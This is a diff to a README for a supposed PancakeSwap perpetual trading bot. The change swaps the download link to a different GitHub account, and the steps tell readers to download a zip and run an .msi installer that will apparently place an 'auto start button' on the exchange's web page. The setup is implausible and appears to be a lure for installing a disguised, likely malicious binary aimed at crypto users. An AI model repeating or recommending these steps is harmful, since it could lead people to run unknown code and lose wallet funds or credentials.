@@ -7,7 +7,7 @@
 
 ## Running the bot is very easy:
 
-Download the [repo.](https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
+Download the [repo.](https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
 Run the **PCSperpbot.msi**
 Go to the Pancakeswap Perpetual Trading page.
 The auto start button will automatically appear as shown in the screenshot above.
